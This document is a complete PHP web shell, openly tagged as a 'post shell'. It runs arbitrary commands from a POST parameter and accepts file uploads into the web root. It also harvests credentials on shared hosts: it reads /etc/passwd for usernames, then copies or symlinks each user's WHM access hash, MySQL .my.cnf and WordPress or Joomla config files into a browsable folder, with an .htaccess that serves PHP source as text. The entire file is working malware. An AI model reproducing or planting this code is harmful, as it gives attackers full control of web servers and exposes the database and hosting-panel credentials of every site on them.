<?php
ini_set('display_errors',0);
echo "<!-- SIMPLE POST SHELL BY AZZATSSINS --!>";
system($_POST['cmd']);
if(isset($_FILES['upload']['name'])){
$name = $_FILES['upload']['name'];
$azx = $_FILES['upload']['tmp_name'];
@move_uploaded_file($azx, $name); echo"<center><a href='{$name}'>SUCCESS</a>";}

if($_POST['config']){
rmdir('azx');
mkdir('azx', 0755);
file_put_contents("azx/.htaccess","Options Indexes FollowSymLinks \nDirectoryIndex x \nAddType txt .php \nAddHandler txt .php",FILE_APPEND);
$a=file_get_contents('/etc/passwd');
preg_match_all('/(.*?):x:/', $a, $an);
foreach($an[1] as $uz){
 
$pt='/home/'.$uz.'/public_html';
$sv='azx/'.$uz;
symlink('/','azx/root');
copy('/home/'.$uz.'/.accesshash',$sv.'-whm.txt');
symlink('/home/'.$uz.'/.accesshash',$sv.'-whm.txt');
copy('/home/'.$uz.'/.my.cnf',$sv.'-cp.txt');
symlink('/home/'.$uz.'/.my.cnf',$sv.'-cp.txt');
copy($pt.'/wp-config.php',$sv.'-wp.txt');
symlink($pt.'/wp-config.php',$sv.'-wp.txt');
copy($pt.'/configuration.php',$sv.'-jml.txt');
symlink($pt.'/configuration.php',$sv.'-jml.txt');
symlink($pt.'/config.inc.php',$sv.'-oth.txt');
symlink($pt.'/config.php',$sv.'-oth.txt');
symlink($pt.'/conn.php',$sv.'-oth.txt');
symlink($pt.'/connection.php',$sv.'-oth.txt');
echo'<meta http-equiv="Refresh" content= "0; url=azx">';
}
}